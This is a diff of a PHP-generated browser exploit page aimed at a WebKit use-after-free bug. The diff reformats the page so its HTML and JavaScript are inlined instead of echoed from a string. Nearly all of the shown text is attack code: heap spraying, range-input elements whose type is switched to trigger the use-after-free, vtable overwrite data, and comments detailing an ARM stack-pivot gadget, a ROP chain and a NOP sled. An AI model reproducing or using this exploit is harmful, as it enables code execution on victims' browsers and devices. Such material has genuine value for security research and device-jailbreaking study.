@@ -78,104 +78,102 @@ for($i=0; $i<2; $i++)
 	for($hashi=0; $hashi<0x20; $hashi+=4)$OBJECTDATA_PADDING .= genu32_unicode(ord($tag[$hashi]) | (ord($tag[$hashi+1])<<8) | (ord($tag[$hashi+2])<<16) | (ord($tag[$hashi+1])<<24));
 }
 $OBJECTDATA_PADDING .= genu32_unicode(0xF4F7F7F7) . "\"";
+?>
+<html>
+	<head>
+		<script language="JavaScript">
+			//http://trac.webkit.org/changeset/158724
 
-$con = "<html>
-<head>
-<script language=\"JavaScript\">
-//http://trac.webkit.org/changeset/158724
+			var haxstr0 = new Array();
+			var haxstr1 = new Array();
+			var longobjstr = "";
+			obj = new Array();
 
-var haxstr0 = new Array();
-var haxstr1 = new Array();
-var longobjstr = \"\";
-obj = new Array();
+			function create_input()
+			{
+				for(i=0; i<0x1000; i++)
+				{
+					haxstr0[i] = unescape(<?= $OBJECTDATA_PADDING ?>);
+				}
 
-function create_input()
-{
-	for(i=0; i<0x1000; i++)
-	{
-		haxstr0[i] = unescape($OBJECTDATA_PADDING);
-	}
+				for(i=0x800; i<0x840; i++) //haxstr0 = null;
+					haxstr0[i] = null;
 
-	for(i=0x800; i<0x840; i++)haxstr0[i] = null;
-	//haxstr0 = null;
+				var haxspan = document.getElementById("haxspan");
 
-	var haxspan = document.getElementById(\"haxspan\");
+				elements = new Array();
+				for(i=0; i<5; i++)
+				{
+					elements[i] = document.createElement("input");
+					elements[i].setAttribute("type", "range");
+					elements[i].setAttribute("id", "input");
+					elements[i].setAttribute("onchange", "this.type = 'hax'; haxx();");
 
-	elements = new Array();
-	for(i=0; i<5; i++)
-	{
-		elements[i] = document.createElement(\"input\");
-		elements[i].setAttribute(\"type\", \"range\");
-		elements[i].setAttribute(\"id\", \"input\");
-		elements[i].setAttribute(\"onchange\", \"this.type = 'hax'; haxx();\");
+					haxspan.appendChild(elements[i]);
+				}
 
-		haxspan.appendChild(elements[i]);
-	}
-	for(i=0; i<5; i++)haxspan.removeChild(elements[i]);
+				for(i=0; i<5; i++)
+					haxspan.removeChild(elements[i]);
 
-	var element = document.createElement(\"input\");
-	element.setAttribute(\"type\", \"range\");
-	element.setAttribute(\"id\", \"input\");
-	element.setAttribute(\"onchange\", \"this.type = 'hax'; haxx();\");
+				var element = document.createElement("input");
+				element.setAttribute("type", "range");
+				element.setAttribute("id", "input");
+				element.setAttribute("onchange", "this.type = 'hax'; haxx();");
 
-	haxspan.appendChild(element);
+				haxspan.appendChild(element);
 
-	elements = new Array();
-	for(i=0; i<5; i++)
-	{
-		elements[i] = document.createElement(\"input\");
-		elements[i].setAttribute(\"type\", \"range\");
-		elements[i].setAttribute(\"id\", \"input\");
-		elements[i].setAttribute(\"onchange\", \"this.type = 'hax'; haxx();\");
+				elements = new Array();
+				for(i=0; i<5; i++)
+				{
+					elements[i] = document.createElement("input");
+					elements[i].setAttribute("type", "range");
+					elements[i].setAttribute("id", "input");
+					elements[i].setAttribute("onchange", "this.type = 'hax'; haxx();");
 
-		haxspan.appendChild(elements[i]);
-	}
-	for(i=0; i<5; i++)haxspan.removeChild(elements[i]);
-}
+					haxspan.appendChild(elements[i]);
+				}
+				for(i=0; i<5; i++)
+					haxspan.removeChild(elements[i]);
+			}
 
-function haxx()//This function was originally based on heap() from: http://www.exploit-db.com/exploits/16974/
-{
-obj2 = new Array();
-var objectdata = unescape($OBJECTDATA_OVERWRITE);//This overwrites the object used in the use-after-free(vtable funcptr call with vtable+0x14c).
+			function haxx()//This function was originally based on heap() from: http://www.exploit-db.com/exploits/16974/
+			{
+				obj2 = new Array();
+				var objectdata = unescape(<?= $OBJECTDATA_OVERWRITE ?>);//This overwrites the object used in the use-after-free(vtable funcptr call with vtable+0x14c).
 
-for(i=0; i<1200; i++)
-{
-	//longobjstr+= objectdata;
-	obj[i] = objectdata;
-}
+				for(i=0; i<1200; i++)
+				{
+					//longobjstr+= objectdata;
+					obj[i] = objectdata;
+				}
 
-var stackpivot = unescape($STACKPIVOT);//stack-pivot gadget called via the use-after-free vtable funcptr: \"ldr lr, [r0, #0x34]\". then the two words from r0+0x38/r0+0x3c are loaded, then written via \"stmdb lr!,{...}\". then it executes: \"ldm r0, {r0, r1, r2, r3, r4, r5, r6, r7, r8, r9, sl, fp, ip}\". then sp=lr, and lr and pc are popped off the stack.
-var ropchainstart = unescape($NOPSLEDROP);//Start of ROP-chain, used as 'NOP'-sled.
-var ropchain = unescape($ROPCHAIN);
+				var stackpivot = unescape(<?= $STACKPIVOT ?>);//stack-pivot gadget called via the use-after-free vtable funcptr: "ldr lr, [r0, #0x34]". then the two words from r0+0x38/r0+0x3c are loaded, then written via "stmdb lr!,{...}". then it executes: "ldm r0, {r0, r1, r2, r3, r4, r5, r6, r7, r8, r9, sl, fp, ip}". then sp=lr, and lr and pc are popped off the stack.
+				var ropchainstart = unescape(<?= $NOPSLEDROP ?>);//Start of ROP-chain, used as 'NOP'-sled.
+				var ropchain = unescape(<?= $ROPCHAIN ?>);
 
- do
- {
-  stackpivot += stackpivot;
-  ropchainstart += ropchainstart;
- 
- } while (stackpivot.length<0x10000);
+				 do
+				 {
+				  stackpivot += stackpivot;
+				  ropchainstart += ropchainstart;
+				 } while (stackpivot.length<0x10000);
 
-ropchainstart += ropchain;
-  
- 
+				ropchainstart += ropchain;
+
         target = new Array();
         for(i = 0; i < 10; i++){
-           
-            if (i<5){ target[i] = stackpivot;}
-            if (i>5){ target[i] = ropchainstart;}
- 
-                  document.write(target[i]);
-                  document.write(\"<br />\");
-}
-}
+            if (i<5) {
+							target[i] = stackpivot;
+						} else if (i>5) {
+							target[i] = ropchainstart;
+						}
 
-</script>
-</head>
-<body onload=\"create_input();\">
-<span id=\"haxspan\">&nbsp;</span>
-</body>
-</html>";
-
-echo $con;
-
-?>
+            document.write(target[i]);
+            document.write("<br/>");
+				}
+			}
+		</script>
+	</head>
+	<body onload="create_input();">
+		<span id="haxspan">&nbsp;</span>
+	</body>
+</html>
